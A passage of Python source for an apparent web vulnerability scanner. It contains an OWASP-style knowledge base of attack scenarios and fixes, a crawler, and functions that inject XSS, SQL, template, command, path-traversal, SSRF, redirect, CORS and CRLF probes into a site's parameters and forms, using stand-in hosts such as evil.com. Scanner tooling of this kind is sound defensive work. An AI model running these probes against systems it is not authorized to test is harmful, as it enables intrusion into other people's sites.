            "  Browser auto-sends the request WITH the victim's session cookie → transfer executes!"
        ),
        "risk": (
            "Forms that perform state-changing actions lack anti-CSRF tokens. "
            "Attackers trick authenticated users into unknowingly submitting actions."
        ),
        "impact": [
            "Unauthorized actions performed with the victim's full privileges",
            "Account modifications — email/password changes without user knowledge",
            "Financial fraud — fund transfers triggered invisibly",
        ],
        "fix": (
            "1. Include a unique, unpredictable synchronizer token in every state-changing form\n"
            "2. Set SameSite=Lax or Strict on all session cookies (modern browsers enforce this)\n"
            "3. Verify the Origin/Referer header on all state-changing endpoints\n"
            "4. Require re-authentication for critical actions (transfers, password change)"
        ),
        "code_example": (
            "<!-- ❌ VULNERABLE form (no CSRF token): -->\n"
            "<form method='POST' action='/transfer'>\n"
            "  <input name='to' value='friend'>\n"
            "  <input name='amount' value='100'>\n"
            "  <button>Send</button>\n"
            "</form>\n\n"
            "<!-- ✅ SAFE — with CSRF token: -->\n"
            "<form method='POST' action='/transfer'>\n"
            "  <input type='hidden' name='csrf_token' value='{{ csrf_token() }}'>\n"
            "  <input name='to' value='friend'>\n"
            "  <input name='amount' value='100'>\n"
            "  <button>Send</button>\n"
            "</form>\n\n"
            "# ✅ SAFE — Django (automatic CSRF middleware):\n"
            "# settings.py: MIDDLEWARE includes 'django.middleware.csrf.CsrfViewMiddleware'\n"
            "# Templates: {% csrf_token %} — that's all that's needed!\n\n"
            "# ✅ SAFE — Cookie-based defence (SameSite):\n"
            "Set-Cookie: sessionid=abc123; SameSite=Strict; HttpOnly; Secure"
        ),
        "references": [
            "https://owasp.org/www-community/attacks/csrf",
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
        ],
    },
    "idor": {
        "severity": "HIGH", "cvss": 7.5,
        "cwe": "CWE-639", "owasp": "A01:2025 Broken Access Control",
        "what": "Insecure Direct Object Reference (IDOR)",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  Your profile: /api/user/1042 returns your data\n"
            "  Attacker changes the ID: /api/user/1043 → returns someone else's full profile!\n"
            "  Automated script enumerates IDs 1 to 100000 → mass data breach of all users."
        ),
        "risk": (
            "Internal object IDs in URLs/params lack authorization checks. "
            "Attackers enumerate IDs to access other users' data."
        ),
        "impact": [
            "Mass data exposure — all user records accessible to any authenticated user",
            "PII/medical/financial data breaches via simple ID enumeration",
            "Modification of other users' data if write endpoints are also vulnerable",
        ],
        "fix": (
            "1. ALWAYS verify server-side that the authenticated user owns the requested resource\n"
            "2. Use UUIDs/GUIDs instead of sequential integer IDs\n"
            "3. Use indirect reference maps (opaque tokens) instead of DB primary keys\n"
            "4. Implement rate limiting on enumerable endpoints\n"
            "5. Log and alert on unusual ID access patterns"
        ),
        "code_example": (
            "# ❌ VULNERABLE — No authorization check:\n"
            "@app.route('/api/user/<int:user_id>')\n"
            "@login_required\n"
            "def get_user(user_id):\n"
            "    return db.get_user(user_id)  # Returns ANY user — no ownership check!\n\n"
            "# ✅ SAFE — Check ownership:\n"
            "@app.route('/api/user/<int:user_id>')\n"
            "@login_required\n"
            "def get_user(user_id):\n"
            "    if user_id != current_user.id and not current_user.is_admin:\n"
            "        abort(403, 'Access denied')  # Block access to others' records\n"
            "    return db.get_user(user_id)\n\n"
            "# ✅ BEST — Use UUIDs, never expose sequential IDs:\n"
            "import uuid\n"
            "# When creating user: user.public_id = str(uuid.uuid4())\n"
            "@app.route('/api/user/<uuid:public_id>')\n"
            "@login_required\n"
            "def get_user(public_id):\n"
            "    user = db.get_by_public_id(public_id)\n"
            "    if user.id != current_user.id:\n"
            "        abort(403)"
        ),
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html",
        ],
    },
    "subdomain_takeover": {
        "severity": "HIGH", "cvss": 7.5,
        "cwe": "CWE-840", "owasp": "A02:2025 Security Misconfiguration",
        "what": "Subdomain Takeover",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  old-blog.company.com CNAME → company.github.io (deleted GitHub Pages site)\n"
            "  Attacker creates GitHub Pages repo at company.github.io\n"
            "  Now old-blog.company.com serves the attacker's content — on YOUR domain!\n"
            "  Cookies scoped to *.company.com are sent to the attacker's page."
        ),
        "risk": (
            "Dangling DNS records point to unclaimed external services. "
            "Attackers claim the service and serve malicious content on your subdomain."
        ),
        "impact": [
            "Phishing — attacker serves convincing content on your trusted domain",
            "Cookie theft — same-domain cookies sent to attacker's server",
            "CSP bypass — if the subdomain is in your Content-Security-Policy allowlist",
        ],
        "fix": (
            "1. Audit ALL DNS CNAME records and verify each target still exists\n"
            "2. DELETE DNS records BEFORE deprovisioning external services\n"
            "3. Implement regular automated subdomain monitoring\n"
            "4. Never use wildcard CNAME records pointing to third-party services"
        ),
        "code_example": (
            "# Audit dangling CNAMEs (bash):\n"
            "$ subfinder -d example.com -silent | while read sub; do\n"
            "    cname=$(dig +short CNAME $sub)\n"
            "    if [ -n '$cname' ]; then\n"
            "        echo '$sub -> $cname'\n"
            "        curl -s --max-time 5 https://$sub | grep -i 'not found\\|no such'\n"
            "    fi\n"
            "done\n\n"
            "# Automated monitoring (Python):\n"
            "import dns.resolver\n"
            "KNOWN_SUBDOMAINS = ['blog.example.com', 'docs.example.com']\n"
            "for sub in KNOWN_SUBDOMAINS:\n"
            "    try:\n"
            "        cname = dns.resolver.resolve(sub, 'CNAME')[0].target\n"
            "        print(f'{sub} -> {cname} (ACTIVE)')\n"
            "    except dns.resolver.NXDOMAIN:\n"
            "        print(f'ALERT: {sub} DNS record is dangling!')\n"
            "        notify_security_team(sub)"
        ),
        "references": [
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover",
        ],
    },
    "http_smuggling": {
        "severity": "HIGH", "cvss": 8.1,
        "cwe": "CWE-444", "owasp": "A02:2025 Security Misconfiguration",
        "what": "HTTP Request Smuggling",
        "scenario": (
            "REAL-WORLD SCENARIO:\n"
            "  Frontend proxy uses Content-Length, backend uses Transfer-Encoding\n"
            "  Attacker sends: POST with both CL:6 and TE:chunked, body: 0\\r\\n\\r\\nGET /admin\n"
            "  Backend sees TWO requests — the smuggled GET /admin bypasses the proxy's auth check!"
        ),
        "risk": (
            "Front-end and back-end disagree on request boundaries due to conflicting "
            "Content-Length and Transfer-Encoding headers."
        ),
        "impact": [
            "Security control bypass — WAF/proxy rules circumvented completely",
            "Request hijacking — steal other users' requests and session tokens",
            "Cache poisoning — inject malicious responses for other users",
        ],
        "fix": (
            "1. Use HTTP/2 end-to-end (not vulnerable to classic smuggling)\n"
            "2. Normalise HTTP parsing — ensure front-end and back-end agree\n"
            "3. Reject requests with both Content-Length and Transfer-Encoding headers\n"
            "4. Configure Nginx/HAProxy to strip or reject ambiguous headers"
        ),
        "code_example": (
            "# ✅ SAFE — Nginx config (reject ambiguous requests):\n"
            "# nginx.conf:\n"
            "proxy_http_version 1.1;\n"
            "proxy_set_header Connection '';\n"
            "# Reject requests with both CL and TE:\n"
            "if ($http_transfer_encoding ~* 'chunked') {\n"
            "    return 400;\n"
            "}\n\n"
            "# ✅ SAFE — HAProxy (strict parsing mode):\n"
            "# haproxy.cfg:\n"
            "option http-use-htx\n"
            "http-request reject if { req.hdr_cnt(Content-Length) gt 1 }\n\n"
            "# ✅ BEST — Upgrade to HTTP/2 throughout:\n"
            "# Caddy automatically uses HTTP/2 — immune to CL.TE and TE.CL smuggling\n"
            "# Apache: sudo a2enmod http2\n"
            "# Protocols h2 http/1.1"
        ),
        "references": [
            "https://portswigger.net/web-security/request-smuggling",
        ],
    },
    "jwt": {
        "severity": "HIGH", "cvss": 8.2,
        "cwe": "CWE-347", "owasp": "A07:2025 Authentication Failures",
        "what": "JWT Authentication Weakness",
        "scenario": (
            "REAL-WORLD SCENARIO (alg:none attack):\n"
            "  Original JWT header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n"
            "  Attacker changes to: {\"alg\":\"none\",\"typ\":\"JWT\"}, modifies payload role to 'admin'\n"
            "  Strips the signature → server accepts the unsigned token → full admin access!"
        ),
        "risk": (
            "The application accepts JWTs with 'none' algorithm or weak HMAC secrets, "
            "allowing attackers to forge tokens and escalate privileges."
        ),
        "impact": [
            "Authentication bypass — forge valid tokens without the secret key",
            "Privilege escalation — change 'role': 'user' to 'role': 'admin'",
            "Account takeover — impersonate any user in the system",
        ],
        "fix": (
            "1. Explicitly reject tokens with alg='none' (never trust the token's own alg claim)\n"
            "2. Use asymmetric algorithms (RS256/ES256) for stronger guarantees\n"
            "3. Use strong, random secrets: at least 256 bits for HMAC\n"
            "4. Validate all claims: exp, iss, aud on every request\n"
            "5. Use a well-maintained JWT library (PyJWT 2.x, jose4j, jsonwebtoken)"
        ),
        "code_example": (
            "# ❌ VULNERABLE — trusts the token's own algorithm claim:\n"
            "alg = jwt.get_unverified_header(token)['alg']  # Attacker sets this to 'none'!\n"
            "payload = jwt.decode(token, secret, algorithms=[alg])\n\n"
            "# ✅ SAFE — enforce algorithm server-side (Python PyJWT):\n"
            "import jwt\n"
            "try:\n"
            "    payload = jwt.decode(\n"
            "        token,\n"
            "        public_key,\n"
            "        algorithms=['RS256'],  # Hardcoded — never from the token!\n"
            "        options={'require': ['exp', 'iss', 'aud']},\n"
            "        audience='https://myapp.com',\n"
            "        issuer='https://auth.myapp.com',\n"
            "    )\n"
            "except jwt.ExpiredSignatureError:\n"
            "    abort(401, 'Token expired')\n"
            "except jwt.InvalidTokenError:\n"
            "    abort(401, 'Invalid token')\n\n"
            "# ✅ SAFE — Generating a strong secret:\n"
            "import secrets\n"
            "JWT_SECRET = secrets.token_hex(32)  # 256-bit random secret"
        ),
        "references": [
            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
        ],
    },
    "missing_header": {
        "severity": "MEDIUM", "cvss": 5.0,
        "cwe": "CWE-693", "owasp": "A02:2025 Security Misconfiguration",
    },
    "info_disclosure": {
        "severity": "MEDIUM", "cvss": 5.3,
        "cwe": "CWE-200", "owasp": "A02:2025 Security Misconfiguration",
    },
    "insecure_cookie": {
        "severity": "HIGH", "cvss": 7.0,
        "cwe": "CWE-614", "owasp": "A02:2025 Security Misconfiguration",
    },
}

# ─────────────────────────────────────────────
# Header descriptions
# ─────────────────────────────────────────────
HEADER_DESCRIPTIONS = {
    "Strict-Transport-Security": {
        "severity": "HIGH",
        "what": "HSTS header is missing.",
        "risk": "Attackers can intercept traffic via SSL stripping / MITM attacks.",
        "fix": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    },
    "Content-Security-Policy": {
        "severity": "HIGH",
        "what": "CSP header is missing.",
        "risk": "No restriction on scripts — XSS becomes far more dangerous without CSP.",
        "fix": "Define a CSP allowlisting only trusted sources: Content-Security-Policy: default-src 'self'",
    },
    "X-Frame-Options": {
        "severity": "MEDIUM",
        "what": "Clickjacking protection missing.",
        "risk": "Attackers embed your page in a hidden iframe to trick users into unintended clicks.",
        "fix": "Add: X-Frame-Options: DENY   (or use CSP frame-ancestors 'none')",
    },
    "X-Content-Type-Options": {
        "severity": "MEDIUM",
        "what": "MIME-type sniffing protection missing.",
        "risk": "Browsers may execute uploaded files as scripts even if served as text/plain.",
        "fix": "Add: X-Content-Type-Options: nosniff",
    },
    "Referrer-Policy": {
        "severity": "LOW",
        "what": "Referrer policy is not set.",
        "risk": "Full URLs with session tokens leak to third-party sites via the Referer header.",
        "fix": "Add: Referrer-Policy: strict-origin-when-cross-origin",
    },
    "Permissions-Policy": {
        "severity": "LOW",
        "what": "Browser feature permissions not restricted.",
        "risk": "Third-party scripts can access camera, microphone, geolocation without restriction.",
        "fix": "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()",
    },
    "Cross-Origin-Opener-Policy": {
        "severity": "LOW",
        "what": "Cross-origin opener policy missing.",
        "risk": "Pages opened via window.open() retain a reference enabling Spectre-type attacks.",
        "fix": "Add: Cross-Origin-Opener-Policy: same-origin",
    },
    "Cross-Origin-Resource-Policy": {
        "severity": "LOW",
        "what": "Cross-origin resource policy missing.",
        "risk": "Other sites can embed your resources, leaking data via side channels.",
        "fix": "Add: Cross-Origin-Resource-Policy: same-origin",
    },
    "Cross-Origin-Embedder-Policy": {
        "severity": "LOW",
        "what": "Cross-origin embedder policy missing.",
        "risk": "Prevents enabling cross-origin isolation for SharedArrayBuffer.",
        "fix": "Add: Cross-Origin-Embedder-Policy: require-corp",
    },
    "X-XSS-Protection": {
        "severity": "LOW",
        "what": "Legacy XSS filter header missing.",
        "risk": "Older browsers without CSP have no built-in XSS filtering.",
        "fix": "Add: X-XSS-Protection: 1; mode=block",
    },
}

INFO_DISCLOSURE_DESCRIPTIONS = {
    "Server": {"severity": "MEDIUM", "what": "Server name/version exposed.", "risk": "Attackers look up CVEs for the exact version.", "fix": "Suppress or genericise the Server header."},
    "X-Powered-By": {"severity": "MEDIUM", "what": "Backend technology/version exposed.", "risk": "Knowing the framework enables targeted exploits.", "fix": "Remove X-Powered-By header entirely."},
    "X-AspNet-Version": {"severity": "MEDIUM", "what": "ASP.NET version exposed.", "risk": "Reveals exact .NET version for targeted attacks.", "fix": "Add <httpRuntime enableVersionHeader='false' /> in web.config."},
    "X-Generator": {"severity": "LOW", "what": "CMS/generator software exposed.", "risk": "Reveals the CMS for targeted exploits.", "fix": "Remove the X-Generator header."},
}

COOKIE_FLAG_DESCRIPTIONS = {
    "Secure": {"severity": "HIGH", "what": "Cookie sent over HTTP.", "risk": "Attackers on same network sniff the cookie.", "fix": "Add Secure flag — cookie sent only over HTTPS."},
    "HttpOnly": {"severity": "HIGH", "what": "Cookie accessible to JavaScript.", "risk": "XSS can steal the cookie via document.cookie.", "fix": "Add HttpOnly flag — blocks JavaScript access."},
    "SameSite": {"severity": "MEDIUM", "what": "No SameSite restriction.", "risk": "Cookie sent in cross-site requests — enables CSRF.", "fix": "Add SameSite=Lax or SameSite=Strict."},
}


# ─────────────────────────────────────────────
# Logging & Colours
# ─────────────────────────────────────────────
logger = logging.getLogger("strikeprobe")

def setup_logging(verbose: bool = False):
    level = logging.DEBUG if verbose else logging.INFO
    handler = logging.StreamHandler(sys.stderr)
    handler.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
    logger.setLevel(level)
    if not logger.handlers:
        logger.addHandler(handler)

SEVERITY_COLORS = {
    "CRITICAL": "\033[91;1m",
    "HIGH":     "\033[91m",
    "MEDIUM":   "\033[93m",
    "LOW":      "\033[94m",
    "INFO":     "\033[96m",
}
RESET = "\033[0m"
BOLD  = "\033[1m"
DIM   = "\033[2m"
GREEN = "\033[92m"
RED   = "\033[91m"
CYAN  = "\033[96m"
YELLOW = "\033[93m"

def severity_badge(sev):
    c = SEVERITY_COLORS.get(sev, "")
    return f"{c}[{sev}]{RESET}"

def print_section(title):
    width = 68
    print(f"\n{'═' * width}")
    print(f"  {BOLD}{title}{RESET}")
    print(f"{'═' * width}")

def print_banner_box(lines, color=CYAN):
    width = max(len(l) for l in lines) + 4
    print(f"\n{color}╔{'═' * width}╗{RESET}")
    for l in lines:
        padding = width - len(l) - 2
        print(f"{color}║  {l}{' ' * padding}║{RESET}")
    print(f"{color}╚{'═' * width}╝{RESET}")


# ─────────────────────────────────────────────
# HTTP Session
# ─────────────────────────────────────────────
def build_session(timeout=(3, 5)):
    session = requests.Session()
    retry_strategy = Retry(total=3, backoff_factor=1,
                           status_forcelist=[429, 500, 502, 503, 504],
                           allowed_methods=["GET", "POST", "HEAD", "OPTIONS"])
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({"User-Agent": DEFAULT_USER_AGENT})
    session._default_timeout = timeout
    session._verify_ssl = True
    return session

def safe_get(session, url, **kwargs):
    timeout = kwargs.pop("timeout", getattr(session, "_default_timeout", (3, 5)))
    verify = kwargs.pop("verify", getattr(session, "_verify_ssl", True))
    try:
        kwargs["stream"] = True
        resp = session.get(url, timeout=timeout, verify=verify, **kwargs)
        resp._content = resp.raw.read(500 * 1024, decode_content=True)
        resp.close()
        return resp
    except Exception as exc:
        logger.debug("GET error %s: %s", url, exc)
    return None

def safe_post(session, url, data=None, **kwargs):
    timeout = kwargs.pop("timeout", getattr(session, "_default_timeout", (3, 5)))
    verify = kwargs.pop("verify", getattr(session, "_verify_ssl", True))
    try:
        kwargs["stream"] = True
        resp = session.post(url, data=data, timeout=timeout, verify=verify, **kwargs)
        resp._content = resp.raw.read(500 * 1024, decode_content=True)
        resp.close()
        return resp
    except Exception as exc:
        logger.debug("POST error %s: %s", url, exc)
    return None

def safe_request(session, method, url, **kwargs):
    timeout = kwargs.pop("timeout", getattr(session, "_default_timeout", (3, 5)))
    verify = kwargs.pop("verify", getattr(session, "_verify_ssl", True))
    try:
        kwargs["stream"] = True
        resp = session.request(method, url, timeout=timeout, verify=verify, **kwargs)
        resp._content = resp.raw.read(500 * 1024, decode_content=True)
        resp.close()
        return resp
    except Exception:
        return None


# ─────────────────────────────────────────────
# Crawler
# ─────────────────────────────────────────────
def crawl(session, target_url, max_depth=2, delay=0, max_threads=20, max_urls=100):
    result = {"urls": set(), "forms": [], "js_urls": set(), "interesting_paths": []}
    target_domain = urlparse(target_url).netloc
    visited = set()
    import threading
    visited_lock = threading.Lock()
    current_level = {target_url}
    seen_forms = set()

    for depth in range(max_depth + 1):
        if not current_level:
            break
        next_level = set()

        def process_url(url):
            with visited_lock:
                if url in visited or len(visited) >= max_urls:
                    return set(), [], set()
                visited.add(url)
            resp = safe_get(session, url)
            if resp is None:
                return set(), [], set()
            content_type = (resp.headers.get("Content-Type") or "").split(";", 1)[0].strip().lower()
            if content_type and "html" not in content_type and not content_type.startswith("text/"):
                return set(), [], set()
            encoding = resp.encoding or "utf-8"
            try:
                markup = (resp.content or b"").decode(encoding, errors="replace")
            except Exception:
                markup = resp.text or ""
            markup = markup.replace("\x00", "")
            try:
                soup = BeautifulSoup(markup, "html.parser")
            except Exception:
                return set(), [], set()
            new_urls, new_forms, new_js_urls = set(), [], set()
            for tag in soup.find_all("a", href=True):
                full_url = urljoin(url, tag["href"])
                parsed = urlparse(full_url)
                if target_domain == parsed.netloc:
                    new_urls.add(urlunparse(parsed._replace(fragment="")))
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = (form.get("method") or "GET").upper()
                full_action = urljoin(url, action)
                if target_domain != urlparse(full_action).netloc:
                    continue
                inputs = [{"name": i.get("name", ""), "type": i.get("type", "text"), "value": i.get("value", "")}
                          for i in form.find_all(["input", "textarea", "select"])]
                form_entry = {"action": full_action, "method": method, "inputs": inputs, "page": url}
                new_forms.append(form_entry)
            for script in soup.find_all("script"):
                if script.string:
                    for js_url in re.findall(r"(?:['\"])(/[a-zA-Z0-9_/\-?=&.]+)(?:['\"])", script.string):
                        full = urljoin(url, js_url)
                        if target_domain == urlparse(full).netloc:
                            new_js_urls.add(full)
            if delay > 0:
                time.sleep(delay)
            return new_urls, new_forms, new_js_urls

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(process_url, u) for u in current_level]
            for future in as_completed(futures):
                try:
                    u_urls, u_forms, u_js_urls = future.result()
                    result["urls"].update(u_urls)
                    for u in u_urls:
                        with visited_lock:
                            if u not in visited and len(visited) + len(next_level) < max_urls:
                                next_level.add(u)
                    for f in u_forms:
                        sig = f"{f['action']}|{f['method']}|{','.join(i.get('name','') for i in f['inputs'])}"
                        if sig not in seen_forms:
                            seen_forms.add(sig)
                            result["forms"].append(f)
                    result["js_urls"].update(u_js_urls)
                except Exception as e:
                    logger.debug(f"Crawl thread error: {e}")
        current_level = next_level

    # Probe common paths
    print(f"  [*] Probing {len(COMMON_PATHS)} sensitive paths...")
    def probe_path(path):
        resp = safe_get(session, urljoin(target_url, path), timeout=(3, 5))
        if resp and resp.status_code == 200 and len(resp.text) > 10:
            return {"path": path, "url": urljoin(target_url, path), "status": resp.status_code, "size": len(resp.text)}
        return None

    with ThreadPoolExecutor(max_workers=20) as executor:
        for finding in executor.map(probe_path, COMMON_PATHS):
            if finding:
                result["interesting_paths"].append(finding)

    # robots.txt & sitemap
    for robots_line in (safe_get(session, urljoin(target_url, "/robots.txt")) or type('', (), {'text': '', 'status_code': 0})()).text.splitlines():
        robots_line = robots_line.strip()
        if robots_line.lower().startswith(("disallow:", "allow:", "sitemap:")):
            parts = robots_line.split(":", 1)
            if len(parts) == 2:
                p = parts[1].strip()
                full = urljoin(target_url, p) if p.startswith("/") else (p if p.startswith("http") else None)
                if full:
                    result["urls"].add(full)

    return result


# ─────────────────────────────────────────────
# Security Header Analysis
# ─────────────────────────────────────────────
def check_security_headers(session, url):
    findings = {"missing_headers": [], "info_disclosure": {}, "cookie_issues": []}
    resp = safe_get(session, url)
    if resp is None:
        return findings
    headers_lower = {k.lower(): v for k, v in resp.headers.items()}
    for h in SECURITY_HEADERS:
        if h.lower() not in headers_lower:
            findings["missing_headers"].append(h)
    for h in INFO_DISCLOSURE_HEADERS:
        for rh, rv in resp.headers.items():
            if rh.lower() == h.lower() and rv:
                findings["info_disclosure"][h] = rv
    raw_cookies = resp.headers.get("Set-Cookie", "")
    for cookie in resp.cookies:
        missing = [flag for flag in COOKIE_FLAGS if flag.lower() not in raw_cookies.lower()]
        if missing:
            findings["cookie_issues"].append({"cookie_name": cookie.name, "missing_flags": missing})
    return findings


# ─────────────────────────────────────────────
# Helper
# ─────────────────────────────────────────────
def _inject_param(url, param_name, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param_name] = [payload]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


# ─────────────────────────────────────────────
# Scan Modules
# ─────────────────────────────────────────────
def test_xss_url(session, url, delay=0):
    findings = []
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    for param in params:
        for payload in XSS_PAYLOADS:
            resp = safe_get(session, _inject_param(url, param, payload))
            if resp and payload in resp.text:
                findings.append({"url": _inject_param(url, param, payload), "param": param, "payload": payload, "type": "url"})
                break
            if delay: time.sleep(delay)
    return findings

def test_xss_form(session, form, delay=0):
    findings = []
    for inp in form["inputs"]:
        name = inp.get("name")
        if not name: continue
        for payload in XSS_PAYLOADS:
            data = {i["name"]: i.get("value", "") for i in form["inputs"] if i.get("name")}
            data[name] = payload
            if form["method"] == "GET":
                parsed = urlparse(form["action"])
                resp = safe_get(session, urlunparse(parsed._replace(query=urlencode(data))))
            else:
                resp = safe_post(session, form["action"], data=data)
            if resp and payload in resp.text:
                findings.append({"form_action": form["action"], "method": form["method"], "param": name, "payload": payload, "type": "form"})
                break
            if delay: time.sleep(delay)
    return findings

def test_sqli_url(session, url, delay=0):
    findings = []
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    for param in params:
        resp = safe_get(session, _inject_param(url, param, SQLI_PAYLOAD))
        if resp:
            body = resp.text.lower()
            for sig in SQLI_ERROR_SIGNATURES:
                if sig in body:
                    findings.append({"url": _inject_param(url, param, SQLI_PAYLOAD), "param": param, "matched_signature": sig, "type": "url"})
                    break
        if delay: time.sleep(delay)
    return findings

def test_sqli_form(session, form, delay=0):
    findings = []
    for inp in form["inputs"]:
        name = inp.get("name")
        if not name: continue
        data = {i["name"]: i.get("value", "") for i in form["inputs"] if i.get("name")}
        data[name] = SQLI_PAYLOAD
        if form["method"] == "GET":
            parsed = urlparse(form["action"])
            resp = safe_get(session, urlunparse(parsed._replace(query=urlencode(data))))
        else:
            resp = safe_post(session, form["action"], data=data)
        if resp:
            body = resp.text.lower()
            for sig in SQLI_ERROR_SIGNATURES:
                if sig in body:
                    findings.append({"form_action": form["action"], "method": form["method"], "param": name, "matched_signature": sig, "type": "form"})
                    break
        if delay: time.sleep(delay)
    return findings

def test_ssti_url(session, url, delay=0):
    findings = []
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    for param in params:
        for probe in SSTI_PAYLOADS:
            resp = safe_get(session, _inject_param(url, param, probe["payload"]))
            if resp and probe["expected"] in resp.text and probe["payload"] not in resp.text:
                findings.append({"url": _inject_param(url, param, probe["payload"]), "param": param, "payload": probe["payload"], "expected": probe["expected"], "engine": probe["engine"], "type": "url"})
                break
            if delay: time.sleep(delay)
    return findings

def test_ssti_form(session, form, delay=0):
    findings = []
    for inp in form["inputs"]:
        name = inp.get("name")
        if not name: continue
        for probe in SSTI_PAYLOADS:
            data = {i["name"]: i.get("value", "") for i in form["inputs"] if i.get("name")}
            data[name] = probe["payload"]
            if form["method"] == "GET":
                parsed = urlparse(form["action"])
                resp = safe_get(session, urlunparse(parsed._replace(query=urlencode(data))))
            else:
                resp = safe_post(session, form["action"], data=data)
            if resp and probe["expected"] in resp.text and probe["payload"] not in resp.text:
                findings.append({"form_action": form["action"], "method": form["method"], "param": name, "payload": probe["payload"], "engine": probe["engine"], "type": "form"})
                break
            if delay: time.sleep(delay)
    return findings

def test_cmdi_url(session, url, delay=0):
    findings = []
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    for param in params:
        for probe in CMDI_PAYLOADS:
            resp = safe_get(session, _inject_param(url, param, probe["payload"]))
            if resp and probe["marker"] in resp.text:
                findings.append({"url": _inject_param(url, param, probe["payload"]), "param": param, "payload": probe["payload"], "os": probe["os"], "type": "url"})
                break
            if delay: time.sleep(delay)
    return findings

def test_cmdi_form(session, form, delay=0):
    findings = []
    for inp in form["inputs"]:
        name = inp.get("name")
        if not name: continue
        for probe in CMDI_PAYLOADS:
            data = {i["name"]: i.get("value", "") for i in form["inputs"] if i.get("name")}
            data[name] = probe["payload"]
            if form["method"] == "GET":
                parsed = urlparse(form["action"])
                resp = safe_get(session, urlunparse(parsed._replace(query=urlencode(data))))
            else:
                resp = safe_post(session, form["action"], data=data)
            if resp and probe["marker"] in resp.text:
                findings.append({"form_action": form["action"], "method": form["method"], "param": name, "payload": probe["payload"], "os": probe["os"], "type": "form"})
                break
            if delay: time.sleep(delay)
    return findings

def test_path_traversal_url(session, url, delay=0):
    findings = []
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    for param in params:
        for probe in PATH_TRAVERSAL_PAYLOADS:
            resp = safe_get(session, _inject_param(url, param, probe["payload"]))
            if resp:
                for ev in probe["evidence"]:
                    if ev in resp.text:
                        findings.append({"url": _inject_param(url, param, probe["payload"]), "param": param, "payload": probe["payload"], "os": probe["os"], "evidence": ev, "type": "url"})
                        break
            if delay: time.sleep(delay)
    return findings

def test_path_traversal_form(session, form, delay=0):
    findings = []
    for inp in form["inputs"]:
        name = inp.get("name")
        if not name: continue
        for probe in PATH_TRAVERSAL_PAYLOADS:
            data = {i["name"]: i.get("value", "") for i in form["inputs"] if i.get("name")}
            data[name] = probe["payload"]
            if form["method"] == "GET":
                parsed = urlparse(form["action"])
                resp = safe_get(session, urlunparse(parsed._replace(query=urlencode(data))))
            else:
                resp = safe_post(session, form["action"], data=data)
            if resp:
                for ev in probe["evidence"]:
                    if ev in resp.text:
                        findings.append({"form_action": form["action"], "method": form["method"], "param": name, "payload": probe["payload"], "evidence": ev, "type": "form"})
                        break
            if delay: time.sleep(delay)
    return findings

def test_ssrf_url(session, url, delay=0):
    findings = []
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    if not params: return findings
    baseline = safe_get(session, url)
    if not baseline: return findings
    import hashlib
    bl_hash = hashlib.md5(baseline.text.encode()).hexdigest()
    bl_len = len(baseline.text)
    for param in params:
        for target in SSRF_TARGETS:
            resp = safe_get(session, _inject_param(url, param, target["url"]))
            if resp:
                rh = hashlib.md5(resp.text.encode()).hexdigest()
                if rh != bl_hash and abs(len(resp.text) - bl_len) > 50:
                    for indicator in ["root:", "localhost", "127.0.0.1", "meta-data", "ami-"]:
                        if indicator.lower() in resp.text.lower():
                            findings.append({"url": _inject_param(url, param, target["url"]), "param": param, "ssrf_target": target["url"], "description": target["description"], "indicator": indicator, "type": "url"})
                            break
            if delay: time.sleep(delay)
    return findings

def test_open_redirect(session, url, delay=0):
    findings = []
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    evil = "https://evil.strikeprobe-test.com"
    for param in params:
        resp = safe_get(session, _inject_param(url, param, evil), allow_redirects=False)
        if resp and resp.status_code in (301, 302, 303, 307, 308) and evil in resp.headers.get("Location", ""):
            findings.append({"url": _inject_param(url, param, evil), "param": param, "redirect_to": resp.headers["Location"], "status_code": resp.status_code, "type": "url"})
        if delay: time.sleep(delay)
    return findings

def test_cors(session, url, delay=0):
    findings = []
    for origin in ["https://evil.com", "null", f"https://{urlparse(url).netloc}.evil.com"]:
        resp = safe_get(session, url, headers={"Origin": origin})
        if resp:
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
            if acao == "*":
                findings.append({"url": url, "origin_sent": origin, "acao": acao, "credentials": acac == "true", "issue": "Wildcard origin — any site reads responses", "severity": "HIGH"})
                break
            elif origin in acao and origin != "null":
                findings.append({"url": url, "origin_sent": origin, "acao": acao, "credentials": acac == "true", "issue": f"Arbitrary origin reflected: {origin}", "severity": "CRITICAL" if acac == "true" else "HIGH"})
                break
        if delay: time.sleep(delay)
    return findings

def test_crlf(session, url, delay=0):
    findings = []
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    for param in params:
        for payload in CRLF_PAYLOADS:
            resp = safe_get(session, _inject_param(url, param, payload), allow_redirects=False)
            if resp and ("strikeprobe" in str(resp.headers).lower() or "<strikeprobe>" in resp.text.lower()):
